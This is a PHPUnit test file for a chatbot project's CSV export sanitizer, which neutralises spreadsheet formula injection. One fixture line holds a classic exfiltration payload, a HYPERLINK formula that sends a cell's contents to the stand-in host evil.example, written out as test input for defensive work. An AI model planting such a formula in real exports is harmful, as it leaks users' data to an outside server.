<?php
declare(strict_types=1);
namespace Pixiekat\EmpathicaChatbot\Tests\Export;

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use Pixiekat\EmpathicaChatbot\Export\CsvSanitizer;

/**
 * Pins the CSV formula-injection guard used by every admin export.
 *
 * Plain TestCase: no kernel, no database. The class is a pure function.
 */
final class CsvSanitizerTest extends TestCase {

  /**
   * Every character a spreadsheet treats as "this cell is a formula".
   *
   * The examples are the classic payloads: a HYPERLINK that leaks data to a
   * remote server, a DDE call that older Excel would run, and arithmetic.
   *
   * @return iterable<string, array{string, string}>
   */
  public static function formulaProvider(): iterable {
    yield 'equals' => ['=HYPERLINK("https://evil.example/?d="&A1,"click")', '\'=HYPERLINK("https://evil.example/?d="&A1,"click")'];
    yield 'plus' => ['+1+1', "'+1+1"];
    yield 'minus' => ['-2+3', "'-2+3"];
    yield 'at' => ['@SUM(A1:A9)', "'@SUM(A1:A9)"];
    yield 'tab' => ["\t=1", "'\t=1"];
    yield 'carriage return' => ["\r=1", "'\r=1"];
  }

  #[DataProvider('formulaProvider')]
  public function testFormulaTriggersAreNeutralised(string $input, string $expected): void {
    $this->assertSame($expected, CsvSanitizer::neutralise($input));
  }

  /**
   * Ordinary text, including text CONTAINING a trigger character after the
   * first position, must come through untouched. Over-escaping would corrupt
   * the research data, e.g. a dose written as "5mg - twice daily".
   *
   * @return iterable<string, array{string}>
   */
  public static function safeProvider(): iterable {
    yield 'plain sentence' => ['What does metformin do?'];
    yield 'trigger later in the text' => ['5mg - twice daily = 10mg'];
    yield 'email in the middle' => ['Ask emily@example.com'];
    yield 'leading space' => [' =not a formula, starts with a space'];
    yield 'accented text' => ['¿Puedo tomar ibuprofeno?'];
  }

  #[DataProvider('safeProvider')]
  public function testOrdinaryTextIsUnchanged(string $input): void {
    $this->assertSame($input, CsvSanitizer::neutralise($input));
  }

  /**
   * Null (a provider that reported no model id, say) becomes an empty cell,
   * not the string "null" and not an error.
   */
  public function testNullAndEmptyBecomeEmptyCells(): void {
    $this->assertSame('', CsvSanitizer::neutralise(null));
    $this->assertSame('', CsvSanitizer::neutralise(''));
  }
}
